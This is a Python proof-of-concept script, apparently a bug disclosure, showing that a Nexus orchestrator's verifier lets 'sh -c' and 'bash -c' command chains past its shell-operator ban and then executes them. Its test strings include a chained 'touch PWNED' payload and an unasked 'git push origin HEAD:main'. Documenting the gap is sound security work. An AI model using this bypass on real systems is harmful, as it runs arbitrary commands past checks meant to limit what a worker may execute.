"""Repro: candidate_verifier._build_verifier_request bans shell operators and
metacharacters in verifier commands, but exempts any argument following '-c'
for ANY executable, so `sh -c "<arbitrary pipeline>"` passes validation and is
executed by run_cli_worker (no executable allowlist)."""
import sys, tempfile, warnings, os
warnings.filterwarnings("ignore")
sys.path.insert(0, "/home/user/Nexus-new")
from nexus.orchestrator.candidate_verifier import CandidateVerifier
from nexus.executors.cli_worker import run_cli_worker

target = tempfile.mkdtemp()
for cmd in [
    "pytest -q; touch PWNED",                              # control
    "sh -c 'echo verifier-ok; touch PWNED_BY_VERIFIER && exit 0'",
    "bash -c 'git -C . push origin HEAD:main || true'",
]:
    try:
        req = CandidateVerifier._build_verifier_request(cmd, target)
        print("ACCEPTED:", cmd, "->", req.command)
    except ValueError as e:
        print("REJECTED:", cmd, "->", e)

req = CandidateVerifier._build_verifier_request("sh -c 'echo verifier-ok; touch PWNED_BY_VERIFIER && exit 0'", target)
res = run_cli_worker(req)
print("exit:", res.exit_code, "stdout:", res.stdout.decode().strip(),
      "| side-effect file exists:", os.path.exists(os.path.join(target, "PWNED_BY_VERIFIER")))
# static preflight used before worker spawn also accepts it
class C: allowed_files=["a.py"]; verifier_commands=["sh -c 'a; b | c'"]
CandidateVerifier.validate_static_contract(C(), target); print("validate_static_contract: PASS")
